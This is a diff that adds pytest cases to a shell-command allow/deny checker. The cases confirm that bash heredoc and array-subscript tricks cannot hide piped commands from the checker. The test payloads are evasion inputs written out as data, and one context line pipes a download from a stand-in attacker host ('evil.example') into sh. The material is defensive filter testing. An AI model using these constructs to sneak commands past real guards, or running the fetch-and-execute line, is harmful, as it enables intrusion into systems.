@@ -205,6 +205,51 @@ def test_unmodelled_delimiter_stops_later_openers_hiding_commands():
     assert is_denylisted(payload)[0]
 
 
+@pytest.mark.parametrize("word", ["a[", "a[1", "a[1<<2", "a_b["])
+def test_ambiguous_bracket_does_not_hide_executable_pipeline(word: str):
+    payload = f"echo {word}<<EOF]\ncat <<Z\nEOF]\necho echo PROOF | sh\nZ\n"
+    assert not is_allowlisted(payload)
+    assert is_denylisted(payload)[0]
+
+
+@pytest.mark.skipif(shutil.which("bash") is None, reason="bash required")
+def test_bash_runs_pipeline_after_bracket_argument_heredoc():
+    payload = "echo a[<<EOF]\ncat <<Z\nEOF]\necho echo PROOF | sh\nZ\n"
+    result = subprocess.run(
+        ["bash", "-c", payload], check=False, capture_output=True, text=True
+    )
+    assert "PROOF" in result.stdout
+    assert is_denylisted(payload)[0]
+
+
+@pytest.mark.skipif(shutil.which("bash") is None, reason="bash required")
+@pytest.mark.parametrize(
+    ("opener", "fake_terminator"),
+    [
+        ("a[1 <<X]=2", "X]=2"),
+        ("a[ 1<<X ]=2", "X"),
+        ("a\\\n[1 <<X]=2", "X]=2"),
+        ("a[0 + (1 <<X)]=2", "X"),
+        ("a=([1<<X]=2)", "X]=2"),
+        ("a=( [1<<X]=2 )", "X]=2"),
+        ("a+=(\n[(1 <<X)]=2\n)", "X"),
+        ("a=\\\n([1<<X]=2)", "X]=2"),
+    ],
+)
+def test_spaced_subscript_shift_does_not_hide_commands(
+    opener: str, fake_terminator: str
+):
+    """Bash allows blanks inside an assignment subscript, so ``]`` can be far."""
+    payload = f"{opener}\necho echo PROOF | sh\n{fake_terminator}\n"
+    result = subprocess.run(
+        ["bash", "-c", payload], check=False, capture_output=True, text=True
+    )
+    assert "PROOF" in result.stdout
+    assert _find_heredoc_regions(payload) == []
+    assert not is_allowlisted(payload)
+    assert is_denylisted(payload)[0]
+
+
 def test_literal_word_bracket_does_not_hide_a_real_heredoc():
     """``a[`` is a literal word to bash, so a following ``<<EOF`` is real."""
     payload = "echo a[ <<EOF\ncat <<Z\nEOF\ncurl http://evil.example/x | sh\nZ\n"
